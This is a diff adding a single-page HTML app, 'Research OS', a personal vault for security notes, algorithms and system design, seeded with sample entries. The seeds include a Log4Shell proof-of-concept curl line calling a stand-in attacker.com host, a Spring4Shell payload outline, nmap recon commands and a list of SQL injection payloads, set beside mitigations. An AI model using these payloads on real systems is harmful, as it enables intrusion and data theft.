@@ -1,0 +1,909 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Research OS</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' rx='22' fill='%235e6ad2'/><text y='.88em' font-size='68' x='14'>⚡</text></svg>"/>
+<link rel="preconnect" href="https://fonts.googleapis.com"/>
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
+<link href="https://fonts.googleapis.com/css2?family=Geist+Mono:wght@400;500&family=Geist:wght@300;400;500;600&display=swap" rel="stylesheet"/>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@tabler/icons-webfont@latest/tabler-icons.min.css"/>
+<style>
+*{box-sizing:border-box;margin:0;padding:0;-webkit-font-smoothing:antialiased}
+ 
+:root{
+  --bg:#ffffff;--bg2:#f7f7f8;--bg3:#f0f0f2;--bg-hover:#f4f4f6;
+  --border:#e5e5e8;--border2:#d8d8dc;
+  --text:#0f0f10;--text2:#6b6b7a;--text3:#9898a8;
+  --accent:#5e6ad2;--accent-bg:#eeeffe;--accent-text:#3a45b0;
+  --green:#3db975;--green-bg:#e8f8ef;--green-text:#1a6e40;
+  --amber:#e8a838;--amber-bg:#fef5e4;--amber-text:#8a5c0a;
+  --red:#e5484d;--red-bg:#ffefef;--red-text:#9e1c20;
+  --blue:#3b82f6;--blue-bg:#eff6ff;--blue-text:#1e40af;
+  --purple:#8b5cf6;--purple-bg:#f5f3ff;--purple-text:#5b21b6;
+  --sidebar-w:220px;
+  --font:'Geist',system-ui,sans-serif;
+  --mono:'Geist Mono',monospace;
+}
+@media(prefers-color-scheme:dark){
+  :root{
+    --bg:#0f0f10;--bg2:#161618;--bg3:#1e1e22;--bg-hover:#1c1c20;
+    --border:#272730;--border2:#32323c;
+    --text:#e8e8f0;--text2:#8888a0;--text3:#55556a;
+    --accent:#6470e0;--accent-bg:#1a1c3a;--accent-text:#9aa0f0;
+    --green:#3db975;--green-bg:#0d2818;--green-text:#5dd89a;
+    --amber:#e8a838;--amber-bg:#2a1e08;--amber-text:#f0c060;
+    --red:#e5484d;--red-bg:#2a0e10;--red-text:#f08088;
+    --blue:#3b82f6;--blue-bg:#0e1e38;--blue-text:#7aa8f8;
+    --purple:#8b5cf6;--purple-bg:#1a1030;--purple-text:#b088f8;
+  }
+}
+ 
+html,body{height:100%;overflow:hidden}
+body{font-family:var(--font);background:var(--bg);color:var(--text);font-size:14px;display:flex}
+ 
+/* ── Sidebar ── */
+.sidebar{
+  width:var(--sidebar-w);min-width:var(--sidebar-w);height:100vh;
+  background:var(--bg2);border-right:1px solid var(--border);
+  display:flex;flex-direction:column;overflow:hidden;
+  user-select:none;
+}
+.sidebar-top{padding:14px 12px 10px;border-bottom:1px solid var(--border)}
+.app-name{display:flex;align-items:center;gap:8px;padding:4px 6px;border-radius:6px;cursor:default}
+.app-icon{width:22px;height:22px;background:var(--accent);border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:11px;color:#fff;font-weight:600;flex-shrink:0}
+.app-label{font-size:13px;font-weight:600;color:var(--text);letter-spacing:-.01em}
+.app-sub{font-size:11px;color:var(--text3)}
+ 
+.search-wrap{padding:8px 10px}
+.search-box{
+  width:100%;background:var(--bg3);border:1px solid var(--border);
+  border-radius:7px;padding:6px 10px 6px 30px;font-size:13px;
+  color:var(--text);font-family:var(--font);outline:none;
+  position:relative;transition:border-color .15s;
+}
+.search-box:focus{border-color:var(--accent)}
+.search-wrap-inner{position:relative}
+.search-icon{position:absolute;left:9px;top:50%;transform:translateY(-50%);color:var(--text3);font-size:14px;pointer-events:none}
+ 
+.nav-section{padding:4px 10px 2px;font-size:11px;color:var(--text3);letter-spacing:.06em;text-transform:uppercase;font-weight:500;margin-top:8px}
+.nav-item{
+  display:flex;align-items:center;gap:8px;padding:6px 10px;margin:1px 4px;
+  border-radius:6px;cursor:pointer;font-size:13px;color:var(--text2);
+  transition:all .1s;white-space:nowrap;overflow:hidden;
+}
+.nav-item:hover{background:var(--bg-hover);color:var(--text)}
+.nav-item.active{background:var(--bg3);color:var(--text);font-weight:500}
+.nav-item i{font-size:15px;flex-shrink:0;width:16px;text-align:center}
+.nav-count{margin-left:auto;font-size:11px;background:var(--bg3);color:var(--text3);padding:1px 6px;border-radius:10px;font-weight:400}
+.nav-item.active .nav-count{background:var(--border2)}
+ 
+.sidebar-bottom{margin-top:auto;padding:10px;border-top:1px solid var(--border)}
+.new-btn{
+  width:100%;display:flex;align-items:center;justify-content:center;gap:6px;
+  padding:7px;background:var(--accent);color:#fff;border:none;
+  border-radius:7px;font-size:13px;font-weight:500;cursor:pointer;
+  font-family:var(--font);transition:opacity .15s;
+}
+.new-btn:hover{opacity:.88}
+ 
+/* ── Main ── */
+.main{flex:1;display:flex;flex-direction:column;height:100vh;overflow:hidden;min-width:0}
+.topbar{
+  height:52px;min-height:52px;border-bottom:1px solid var(--border);
+  display:flex;align-items:center;padding:0 20px;gap:12px;
+  background:var(--bg);
+}
+.topbar-title{font-size:14px;font-weight:600;color:var(--text);flex:1;letter-spacing:-.01em}
+.topbar-actions{display:flex;gap:6px;align-items:center}
+.tag-filter{display:flex;gap:4px;flex-wrap:wrap;align-items:center}
+.tag-chip{
+  font-size:11px;padding:3px 9px;border-radius:10px;cursor:pointer;
+  border:1px solid var(--border);background:var(--bg2);color:var(--text2);
+  transition:all .12s;font-family:var(--font);white-space:nowrap;
+}
+.tag-chip:hover{border-color:var(--accent);color:var(--accent)}
+.tag-chip.active{background:var(--accent-bg);border-color:var(--accent);color:var(--accent-text)}
+.icon-btn{
+  width:30px;height:30px;display:flex;align-items:center;justify-content:center;
+  border-radius:6px;cursor:pointer;color:var(--text2);border:1px solid var(--border);
+  background:none;font-size:16px;transition:all .12s;
+}
+.icon-btn:hover{background:var(--bg3);color:var(--text)}
+ 
+.content{flex:1;overflow-y:auto;padding:20px}
+.content::-webkit-scrollbar{width:6px}
+.content::-webkit-scrollbar-track{background:transparent}
+.content::-webkit-scrollbar-thumb{background:var(--border2);border-radius:3px}
+ 
+/* ── Cards ── */
+.cards-grid{display:flex;flex-direction:column;gap:8px}
+.card{
+  background:var(--bg);border:1px solid var(--border);border-radius:10px;
+  padding:14px 16px;cursor:pointer;transition:all .12s;
+  animation:fadeIn .15s ease;
+}
+@keyframes fadeIn{from{opacity:0;transform:translateY(4px)}to{opacity:1;transform:translateY(0)}}
+.card:hover{border-color:var(--border2);background:var(--bg2)}
+.card-header{display:flex;align-items:flex-start;gap:10px;margin-bottom:8px}
+.card-icon{width:28px;height:28px;border-radius:7px;display:flex;align-items:center;justify-content:center;font-size:14px;flex-shrink:0;margin-top:1px}
+.card-meta{flex:1;min-width:0}
+.card-title{font-size:13px;font-weight:500;color:var(--text);margin-bottom:3px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.card-subtitle{font-size:12px;color:var(--text2)}
+.card-body{font-size:13px;color:var(--text2);line-height:1.6;margin-bottom:10px;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
+.card-footer{display:flex;align-items:center;gap:6px;flex-wrap:wrap}
+.tag{font-size:11px;padding:2px 8px;border-radius:6px;font-weight:400;white-space:nowrap}
+.card-date{font-size:11px;color:var(--text3);margin-left:auto}
+.severity{font-size:11px;padding:2px 8px;border-radius:6px;font-weight:500}
+.sev-critical{background:var(--red-bg);color:var(--red-text)}
+.sev-high{background:var(--amber-bg);color:var(--amber-text)}
+.sev-medium{background:var(--blue-bg);color:var(--blue-text)}
+.sev-low{background:var(--green-bg);color:var(--green-text)}
+.sev-info{background:var(--bg3);color:var(--text2)}
+ 
+/* ── Detail panel ── */
+.detail-overlay{
+  display:none;position:fixed;inset:0;background:rgba(0,0,0,.3);
+  z-index:100;backdrop-filter:blur(2px);
+}
+.detail-overlay.open{display:block}
+.detail-panel{
+  position:fixed;top:0;right:0;bottom:0;width:560px;max-width:95vw;
+  background:var(--bg);border-left:1px solid var(--border);
+  display:flex;flex-direction:column;z-index:101;
+  transform:translateX(100%);transition:transform .2s cubic-bezier(.4,0,.2,1);
+}
+.detail-panel.open{transform:translateX(0)}
+.detail-header{
+  padding:16px 20px;border-bottom:1px solid var(--border);
+  display:flex;align-items:center;gap:10px;
+}
+.detail-close{
+  width:28px;height:28px;display:flex;align-items:center;justify-content:center;
+  border-radius:6px;cursor:pointer;color:var(--text2);border:none;background:none;
+  font-size:16px;transition:background .12s;margin-left:auto;
+}
+.detail-close:hover{background:var(--bg3)}
+.detail-body{flex:1;overflow-y:auto;padding:20px}
+.detail-body::-webkit-scrollbar{width:6px}
+.detail-body::-webkit-scrollbar-thumb{background:var(--border2);border-radius:3px}
+.detail-title-input{
+  font-size:18px;font-weight:600;color:var(--text);background:none;
+  border:none;outline:none;width:100%;font-family:var(--font);
+  margin-bottom:12px;letter-spacing:-.02em;
+}
+.detail-field{margin-bottom:16px}
+.field-label{font-size:11px;color:var(--text3);text-transform:uppercase;letter-spacing:.06em;margin-bottom:5px;font-weight:500}
+.field-input{
+  width:100%;background:var(--bg2);border:1px solid var(--border);
+  border-radius:7px;padding:8px 10px;font-size:13px;color:var(--text);
+  font-family:var(--font);outline:none;transition:border-color .15s;
+}
+.field-input:focus{border-color:var(--accent)}
+.field-textarea{
+  width:100%;background:var(--bg2);border:1px solid var(--border);
+  border-radius:7px;padding:8px 10px;font-size:13px;color:var(--text);
+  font-family:var(--font);outline:none;resize:vertical;line-height:1.6;
+  transition:border-color .15s;min-height:80px;
+}
+.field-textarea:focus{border-color:var(--accent)}
+.code-area{
+  width:100%;background:var(--bg3);border:1px solid var(--border);
+  border-radius:7px;padding:10px 12px;font-size:12px;color:var(--text);
+  font-family:var(--mono);outline:none;resize:vertical;line-height:1.7;
+  transition:border-color .15s;min-height:100px;
+}
+.code-area:focus{border-color:var(--accent)}
+.tags-input-wrap{display:flex;flex-wrap:wrap;gap:5px;align-items:center;background:var(--bg2);border:1px solid var(--border);border-radius:7px;padding:6px 8px;cursor:text}
+.tags-input-wrap:focus-within{border-color:var(--accent)}
+.tag-input-chip{display:flex;align-items:center;gap:4px;font-size:12px;padding:2px 8px;border-radius:6px;background:var(--accent-bg);color:var(--accent-text)}
+.tag-rm{cursor:pointer;font-size:14px;line-height:1;opacity:.7}
+.tag-rm:hover{opacity:1}
+.tag-text-input{border:none;background:none;outline:none;font-size:13px;color:var(--text);font-family:var(--font);min-width:80px;flex:1}
+.detail-footer{padding:14px 20px;border-top:1px solid var(--border);display:flex;gap:8px}
+.btn-save{
+  flex:1;background:var(--accent);color:#fff;border:none;padding:9px;
+  border-radius:7px;font-size:13px;font-weight:500;cursor:pointer;
+  font-family:var(--font);transition:opacity .15s;
+}
+.btn-save:hover{opacity:.88}
+.btn-delete{
+  padding:9px 16px;background:none;color:var(--text2);border:1px solid var(--border);
+  border-radius:7px;font-size:13px;cursor:pointer;font-family:var(--font);
+  transition:all .15s;
+}
+.btn-delete:hover{background:var(--red-bg);color:var(--red-text);border-color:var(--red)}
+ 
+/* ── Modal (new entry) ── */
+.modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.4);z-index:200;align-items:center;justify-content:center;padding:1rem;backdrop-filter:blur(4px)}
+.modal-overlay.open{display:flex}
+.modal{background:var(--bg);border:1px solid var(--border2);border-radius:12px;padding:20px;width:100%;max-width:440px;box-shadow:0 20px 60px rgba(0,0,0,.25);animation:modalIn .18s ease}
+@keyframes modalIn{from{opacity:0;transform:scale(.97)}to{opacity:1;transform:scale(1)}}
+.modal-title{font-size:16px;font-weight:600;margin-bottom:16px;letter-spacing:-.01em}
+.modal label{display:block;font-size:11px;color:var(--text3);text-transform:uppercase;letter-spacing:.06em;margin-bottom:4px;font-weight:500;margin-top:12px}
+.modal label:first-of-type{margin-top:0}
+.modal input,.modal select,.modal textarea{
+  width:100%;background:var(--bg2);border:1px solid var(--border);
+  border-radius:7px;padding:8px 10px;font-size:13px;color:var(--text);
+  font-family:var(--font);outline:none;transition:border-color .15s;
+}
+.modal input:focus,.modal select:focus,.modal textarea:focus{border-color:var(--accent)}
+.modal textarea{resize:none;line-height:1.6}
+.modal-btns{display:flex;gap:8px;margin-top:16px}
+.btn-primary{flex:1;background:var(--accent);color:#fff;border:none;padding:9px;border-radius:7px;font-size:13px;font-weight:500;cursor:pointer;font-family:var(--font);transition:opacity .15s}
+.btn-primary:hover{opacity:.88}
+.btn-cancel{flex:1;background:none;color:var(--text2);border:1px solid var(--border);padding:9px;border-radius:7px;font-size:13px;cursor:pointer;font-family:var(--font)}
+.btn-cancel:hover{background:var(--bg3)}
+ 
+/* ── Empty state ── */
+.empty{text-align:center;padding:4rem 2rem;color:var(--text3)}
+.empty i{font-size:32px;margin-bottom:12px;display:block;opacity:.4}
+.empty p{font-size:13px;line-height:1.6}
+ 
+/* ── Section-specific field sets ── */
+.checklist-item{display:flex;align-items:flex-start;gap:8px;padding:7px 0;border-bottom:1px solid var(--border)}
+.checklist-item:last-child{border-bottom:none}
+.checklist-cb{width:15px;height:15px;accent-color:var(--accent);margin-top:1px;flex-shrink:0;cursor:pointer}
+.checklist-label{font-size:13px;color:var(--text);flex:1}
+.checklist-item.checked .checklist-label{text-decoration:line-through;color:var(--text3)}
+ 
+.select-row{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+ 
+/* ── Scrollbars global ── */
+::-webkit-scrollbar{width:5px;height:5px}
+::-webkit-scrollbar-track{background:transparent}
+::-webkit-scrollbar-thumb{background:var(--border2);border-radius:3px}
+</style>
+</head>
+<body>
+ 
+<!-- Sidebar -->
+<nav class="sidebar">
+  <div class="sidebar-top">
+    <div class="app-name">
+      <div class="app-icon">OS</div>
+      <div>
+        <div class="app-label">Research OS</div>
+        <div class="app-sub">personal research vault</div>
+      </div>
+    </div>
+  </div>
+  <div class="search-wrap">
+    <div class="search-wrap-inner">
+      <i class="ti ti-search search-icon" aria-hidden="true"></i>
+      <input class="search-box" type="text" id="globalSearch" placeholder="Search everything…" autocomplete="off"/>
+    </div>
+  </div>
+ 
+  <div class="nav-section">Security</div>
+  <div class="nav-item active" data-section="cve" onclick="nav(this)">
+    <i class="ti ti-bug" aria-hidden="true"></i> CVE Research
+    <span class="nav-count" id="cnt-cve">0</span>
+  </div>
+  <div class="nav-item" data-section="cheatsheet" onclick="nav(this)">
+    <i class="ti ti-terminal-2" aria-hidden="true"></i> Cheatsheets
+    <span class="nav-count" id="cnt-cheatsheet">0</span>
+  </div>
+  <div class="nav-item" data-section="threatmodel" onclick="nav(this)">
+    <i class="ti ti-shield-check" aria-hidden="true"></i> Threat Models
+    <span class="nav-count" id="cnt-threatmodel">0</span>
+  </div>
+  <div class="nav-item" data-section="securereview" onclick="nav(this)">
+    <i class="ti ti-checklist" aria-hidden="true"></i> Secure Review
+    <span class="nav-count" id="cnt-securereview">0</span>
+  </div>
+ 
+  <div class="nav-section">Engineering</div>
+  <div class="nav-item" data-section="dsa" onclick="nav(this)">
+    <i class="ti ti-binary-tree" aria-hidden="true"></i> DSA Patterns
+    <span class="nav-count" id="cnt-dsa">0</span>
+  </div>
+  <div class="nav-item" data-section="sysdesign" onclick="nav(this)">
+    <i class="ti ti-topology-star" aria-hidden="true"></i> System Design
+    <span class="nav-count" id="cnt-sysdesign">0</span>
+  </div>
+  <div class="nav-item" data-section="codereview" onclick="nav(this)">
+    <i class="ti ti-code" aria-hidden="true"></i> Code Review
+    <span class="nav-count" id="cnt-codereview">0</span>
+  </div>
+ 
+  <div class="sidebar-bottom">
+    <button class="new-btn" onclick="openNewModal()">
+      <i class="ti ti-plus" aria-hidden="true"></i> New entry
+    </button>
+  </div>
+</nav>
+ 
+<!-- Main -->
+<div class="main">
+  <div class="topbar">
+    <div class="topbar-title" id="topbarTitle">CVE Research</div>
+    <div class="topbar-actions">
+      <div class="tag-filter" id="tagFilter"></div>
+      <button class="icon-btn" onclick="openNewModal()" title="New entry"><i class="ti ti-plus" aria-hidden="true"></i></button>
+    </div>
+  </div>
+  <div class="content">
+    <div class="cards-grid" id="cardsGrid"></div>
+  </div>
+</div>
+ 
+<!-- Detail panel -->
+<div class="detail-overlay" id="detailOverlay" onclick="closeDetail()"></div>
+<div class="detail-panel" id="detailPanel">
+  <div class="detail-header">
+    <div class="card-icon" id="detailIcon" style="width:28px;height:28px;border-radius:7px;display:flex;align-items:center;justify-content:center;font-size:14px"></div>
+    <div style="font-size:12px;color:var(--text3)" id="detailSectionLabel"></div>
+    <button class="detail-close" onclick="closeDetail()"><i class="ti ti-x" aria-hidden="true"></i></button>
+  </div>
+  <div class="detail-body" id="detailBody"></div>
+  <div class="detail-footer">
+    <button class="btn-save" onclick="saveEntry()">Save changes</button>
+    <button class="btn-delete" onclick="deleteEntry()">Delete</button>
+  </div>
+</div>
+ 
+<!-- New entry modal -->
+<div class="modal-overlay" id="modalOverlay">
+  <div class="modal">
+    <div class="modal-title">New entry</div>
+    <label for="newSection">Section</label>
+    <select id="newSection" onchange="updateNewForm()">
+      <option value="cve">CVE Research</option>
+      <option value="cheatsheet">Cheatsheet</option>
+      <option value="threatmodel">Threat Model</option>
+      <option value="securereview">Secure Review Checklist</option>
+      <option value="dsa">DSA Pattern</option>
+      <option value="sysdesign">System Design</option>
+      <option value="codereview">Code Review / Debug</option>
+    </select>
+    <label for="newTitle">Title</label>
+    <input type="text" id="newTitle" placeholder="e.g. CVE-2024-1234" autocomplete="off"/>
+    <label for="newSub">Subtitle / one-liner</label>
+    <input type="text" id="newSub" placeholder="Brief description"/>
+    <div id="newExtraFields"></div>
+    <div class="modal-btns">
+      <button class="btn-cancel" onclick="closeModal()">Cancel</button>
+      <button class="btn-primary" onclick="createEntry()">Create</button>
+    </div>
+  </div>
+</div>
+ 
+<script>
+// ── Constants ──
+const SECTIONS = {
+  cve:          { label:'CVE Research',    icon:'ti-bug',          color:'var(--red-bg)',    iconColor:'var(--red-text)' },
+  cheatsheet:   { label:'Cheatsheets',     icon:'ti-terminal-2',   color:'var(--green-bg)',  iconColor:'var(--green-text)' },
+  threatmodel:  { label:'Threat Models',   icon:'ti-shield-check', color:'var(--purple-bg)', iconColor:'var(--purple-text)' },
+  securereview: { label:'Secure Review',   icon:'ti-checklist',    color:'var(--amber-bg)',  iconColor:'var(--amber-text)' },
+  dsa:          { label:'DSA Patterns',    icon:'ti-binary-tree',  color:'var(--blue-bg)',   iconColor:'var(--blue-text)' },
+  sysdesign:    { label:'System Design',   icon:'ti-topology-star',color:'var(--accent-bg)', iconColor:'var(--accent-text)' },
+  codereview:   { label:'Code Review',     icon:'ti-code',         color:'var(--green-bg)',  iconColor:'var(--green-text)' },
+};
+ 
+const TAG_COLORS = [
+  'background:var(--accent-bg);color:var(--accent-text)',
+  'background:var(--green-bg);color:var(--green-text)',
+  'background:var(--amber-bg);color:var(--amber-text)',
+  'background:var(--purple-bg);color:var(--purple-text)',
+  'background:var(--blue-bg);color:var(--blue-text)',
+];
+function tagStyle(tag){
+  let h=0;for(let c of tag)h=(h*31+c.charCodeAt(0))%TAG_COLORS.length;
+  return TAG_COLORS[h];
+}
+ 
+// ── State ──
+let state = loadState();
+let currentSection = 'cve';
+let activeTag = null;
+let editingId = null;
+let searchQuery = '';
+ 
+function loadState(){
+  try{ const r=localStorage.getItem('kb_v1'); if(r) return JSON.parse(r); }catch(e){}
+  return { entries: defaultEntries() };
+}
+function save(){ localStorage.setItem('kb_v1', JSON.stringify(state)); }
+ 
+function defaultEntries(){
+  const now = () => new Date().toISOString();
+  return [
+    // CVE
+    { id:1, section:'cve', title:'CVE-2021-44228', subtitle:'Log4Shell — RCE via JNDI injection', tags:['critical','java','rce'],
+      severity:'critical', affected:'Apache Log4j 2.0-beta9 to 2.14.1',
+      description:'JNDI lookup feature allows unauthenticated RCE. Attacker sends ${jndi:ldap://attacker.com/a} in any logged field.',
+      poc:'curl -H "X-Api-Version: ${jndi:ldap://attacker.com/}" https://target.com',
+      mitigation:'Upgrade to Log4j 2.17.1+. Set log4j2.formatMsgNoLookups=true as workaround.',
+      references:'https://nvd.nist.gov/vuln/detail/CVE-2021-44228', notes:'', createdAt:now() },
+    { id:2, section:'cve', title:'CVE-2022-22965', subtitle:'Spring4Shell — RCE via data binding', tags:['high','java','spring'],
+      severity:'high', affected:'Spring Framework 5.3.x < 5.3.18, 5.2.x < 5.2.20',
+      description:'ClassLoader manipulation via Spring MVC data binding allows writing a JSP webshell to the server.',
+      poc:'POST /vulnerable-endpoint with class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{...}',
+      mitigation:'Upgrade Spring Framework. Use DataBinder.setDisallowedFields to blocklist class.*, Class.*, *.class.*',
+      references:'https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement', notes:'', createdAt:now() },
+    // Cheatsheet
+    { id:3, section:'cheatsheet', title:'nmap essentials', subtitle:'Port scanning & service enumeration',
+      tags:['recon','network'], category:'recon',
+      content:`# Quick scan
+nmap -sV -sC -oN scan.txt TARGET
+ 
+# Full port scan
+nmap -p- --min-rate 5000 TARGET
+ 
+# UDP scan (top 100)
+nmap -sU --top-ports 100 TARGET
+ 
+# OS detection
+nmap -O -A TARGET
+ 
+# Script scan
+nmap --script vuln TARGET`, notes:'', createdAt:now() },
+    { id:4, section:'cheatsheet', title:'SQL injection payloads', subtitle:'Auth bypass, error-based, blind',
+      tags:['sqli','web','payload'], category:'payloads',
+      content:`# Auth bypass
+' OR '1'='1
+' OR 1=1--
+admin'--
+ 
+# Error-based (MySQL)
+' AND extractvalue(1,concat(0x7e,(SELECT version())))--
+ 
+# Blind boolean
+' AND 1=1--   (true)
+' AND 1=2--   (false)
+ 
+# Time-based blind
+' AND SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--
+ 
+# UNION-based
+' ORDER BY 3--
+' UNION SELECT null,null,null--`, notes:'', createdAt:now() },
+    // Threat Model
+    { id:5, section:'threatmodel', title:'Web Application', subtitle:'Standard 3-tier web app threat model',
+      tags:['web','owasp'], systemType:'web-app',
+      assets:'User data, session tokens, DB credentials, admin interface',
+      threats:`STRIDE analysis:
+- Spoofing: Weak auth, session fixation
+- Tampering: SQLi, parameter manipulation, mass assignment
+- Repudiation: Missing audit logs
+- Info Disclosure: Verbose errors, IDOR, path traversal
+- DoS: No rate limiting, large file uploads
+- EoP: Priv escalation via IDOR, broken access control`,
+      mitigations:`- Auth: MFA, secure session management (HttpOnly, Secure, SameSite)
+- Input: Parameterized queries, output encoding, CSP
+- Logging: Centralized audit logs for all auth events
+- Access: RBAC, least privilege, deny-by-default
+- Rate limiting: On all auth endpoints
+- Secrets: Vault / env vars, never in code`, notes:'', createdAt:now() },
+    // Secure Review
+    { id:6, section:'securereview', title:'Python / Flask', subtitle:'Secure code review checklist',
+      tags:['python','web'], language:'python',
+      checklist:[
+        {text:'No raw SQL — use parameterized queries or ORM', done:false},
+        {text:'User input validated and sanitized before use', done:false},
+        {text:'Secrets loaded from env vars, not hardcoded', done:false},
+        {text:'Flask debug mode disabled in production', done:false},
+        {text:'CSRF protection enabled (Flask-WTF)', done:false},
+        {text:'Passwords hashed with bcrypt/argon2, not md5/sha1', done:false},
+        {text:'File uploads restricted by type and size', done:false},
+        {text:'Error handlers don\'t leak stack traces', done:false},
+        {text:'HTTPS enforced, HSTS header set', done:false},
+        {text:'Dependency audit: pip-audit or safety', done:false},
+      ], notes:'', createdAt:now() },
+    // DSA
+    { id:7, section:'dsa', title:'Sliding Window', subtitle:'Variable & fixed window on arrays/strings',
+      tags:['array','string','medium'], complexity:'O(n) time, O(k) space',
+      when:'Subarray/substring of size k or with constraint. Max/min sum, longest substring.',
+      template:`def max_subarray(nums, k):
+    window_sum = sum(nums[:k])
+    max_sum = window_sum
+    for i in range(k, len(nums)):
+        window_sum += nums[i] - nums[i-k]
+        max_sum = max(max_sum, window_sum)
+    return max_sum
+ 
+# Variable window (expand/shrink)
+def longest_no_repeat(s):
+    seen = {}
+    l = res = 0
+    for r, c in enumerate(s):
+        if c in seen and seen[c] >= l:
+            l = seen[c] + 1
+        seen[c] = r
+        res = max(res, r - l + 1)
+    return res`,
+      example:'LC 3 — Longest Substring Without Repeating Characters', notes:'', createdAt:now() },
+    { id:8, section:'dsa', title:'Two Pointers', subtitle:'Left/right pointers moving toward each other',
+      tags:['array','sorting','easy'], complexity:'O(n) time, O(1) space',
+      when:'Sorted array. Finding pairs summing to target. Palindrome check. Remove duplicates.',
+      template:`def two_sum_sorted(nums, target):
+    l, r = 0, len(nums) - 1
+    while l < r:
+        s = nums[l] + nums[r]
+        if s == target: return [l, r]
+        elif s < target: l += 1
+        else: r -= 1
+    return []`,
+      example:'LC 167 — Two Sum II, LC 11 — Container With Most Water', notes:'', createdAt:now() },
+    // System Design
+    { id:9, section:'sysdesign', title:'URL Shortener', subtitle:'TinyURL / Bitly design',
+      tags:['hashing','db','scale'], scale:'100M URLs, 10K writes/s, 100K reads/s',
+      components:`- API: POST /shorten → {long_url} → {short_url}
+         GET /{code} → 301/302 redirect
+- Hash: MD5(url)[0:7] or base62(counter). Handle collisions.
+- DB: Write: MySQL/Postgres (URL metadata). Read: Redis cache (hot URLs).
+- CDN: Cache redirects at edge for hot links.`,
+      tradeoffs:`- 301 (perm redirect) vs 302 (temp): 301 reduces server load but 302 allows analytics.
+- Collision handling: append user_id or retry with longer hash.
+- Custom aliases: separate table, check uniqueness.`,
+      scalability:`- Read-heavy: Redis cache with LRU eviction for top 20% URLs → 80% traffic
+- DB sharding by hash prefix if >1B rows
+- Async analytics writes via Kafka`,
+      notes:'', createdAt:now() },
+    // Code Review
+    { id:10, section:'codereview', title:'Mass assignment vulnerability', subtitle:'Pattern to watch in web frameworks',
+      tags:['security','web','python'], type:'pattern',
+      pattern:`# Bad — binds all request params to model
+user = User(**request.json)
+ 
+# Good — explicit allowlist
+ALLOWED = {'name', 'email', 'bio'}
+user = User(**{k:v for k,v in request.json.items() if k in ALLOWED})
+ 
+# Django — use fields= in serializer
+class UserSerializer(serializers.ModelSerializer):
+    class Meta:
+        model = User
+        fields = ['name', 'email']  # never use '__all__'`,
+      rootCause:'Framework auto-binds request body to model without filtering, allowing hidden fields (is_admin, role) to be set.',
+      fix:'Always use explicit field lists. Audit any ** unpacking of user-supplied data.',
+      notes:'', createdAt:now() },
+  ];
+}
+ 
+// ── Navigation ──
+function nav(el){
+  document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active'));
+  el.classList.add('active');
+  currentSection = el.dataset.section;
+  activeTag = null;
+  searchQuery = document.getElementById('globalSearch').value;
+  document.getElementById('topbarTitle').textContent = SECTIONS[currentSection].label;
+  renderTagFilter();
+  renderCards();
+}
+ 
+// ── Search ──
+document.getElementById('globalSearch').addEventListener('input', e=>{
+  searchQuery = e.target.value.toLowerCase();
+  renderCards();
+});
+ 
+// ── Tags ──
+function allTagsForSection(){
+  const tags = new Set();
+  state.entries.filter(e=>e.section===currentSection).forEach(e=>(e.tags||[]).forEach(t=>tags.add(t)));
+  return [...tags];
+}
+ 
+function renderTagFilter(){
+  const wrap = document.getElementById('tagFilter');
+  const tags = allTagsForSection();
+  wrap.innerHTML = '';
+  tags.forEach(t=>{
+    const chip = document.createElement('span');
+    chip.className = 'tag-chip' + (activeTag===t?' active':'');
+    chip.textContent = t;
+    chip.onclick = () => { activeTag = activeTag===t?null:t; renderTagFilter(); renderCards(); };
+    wrap.appendChild(chip);
+  });
+}
+ 
+// ── Cards ──
+function renderCards(){
+  updateCounts();
+  const grid = document.getElementById('cardsGrid');
+  let entries = state.entries.filter(e=>e.section===currentSection);
+  if(activeTag) entries = entries.filter(e=>(e.tags||[]).includes(activeTag));
+  if(searchQuery) entries = entries.filter(e=>{
+    const q=searchQuery;
+    return (e.title||'').toLowerCase().includes(q)||(e.subtitle||'').toLowerCase().includes(q)||(e.description||e.content||e.pattern||'').toLowerCase().includes(q)||(e.tags||[]).join(' ').toLowerCase().includes(q);
+  });
+ 
+  if(!entries.length){
+    grid.innerHTML=`<div class="empty"><i class="ti ti-inbox" aria-hidden="true"></i><p>${searchQuery||activeTag?'No results found.':'No entries yet. Hit + to add your first one.'}</p></div>`;
+    return;
+  }
+ 
+  grid.innerHTML='';
+  entries.forEach(entry=>{
+    const s = SECTIONS[entry.section];
+    const card = document.createElement('div');
+    card.className='card';
+    card.onclick=()=>openDetail(entry.id);
+ 
+    const body = entry.description||entry.content||entry.pattern||entry.threats||entry.template||entry.components||'';
+    const tagsHtml = (entry.tags||[]).map(t=>`<span class="tag" style="${tagStyle(t)}">${t}</span>`).join('');
+    const severityHtml = entry.severity?`<span class="severity sev-${entry.severity}">${entry.severity}</span>`:'';
+    const date = entry.createdAt ? new Date(entry.createdAt).toLocaleDateString('en-GB',{day:'numeric',month:'short'}) : '';
+ 
+    card.innerHTML=`
+      <div class="card-header">
+        <div class="card-icon" style="background:${s.color}"><i class="ti ${s.icon}" style="color:${s.iconColor}" aria-hidden="true"></i></div>
+        <div class="card-meta">
+          <div class="card-title">${esc(entry.title)}</div>
+          <div class="card-subtitle">${esc(entry.subtitle||'')}</div>
+        </div>
+      </div>
+      ${body?`<div class="card-body">${esc(body)}</div>`:''}
+      <div class="card-footer">${severityHtml}${tagsHtml}<span class="card-date">${date}</span></div>
+    `;
+    grid.appendChild(card);
+  });
+}
+ 
+function updateCounts(){
+  Object.keys(SECTIONS).forEach(s=>{
+    const el=document.getElementById('cnt-'+s);
+    if(el) el.textContent=state.entries.filter(e=>e.section===s).length;
+  });
+}
+ 
+// ── Detail panel ──
+function openDetail(id){
+  const entry = state.entries.find(e=>e.id===id);
+  if(!entry) return;
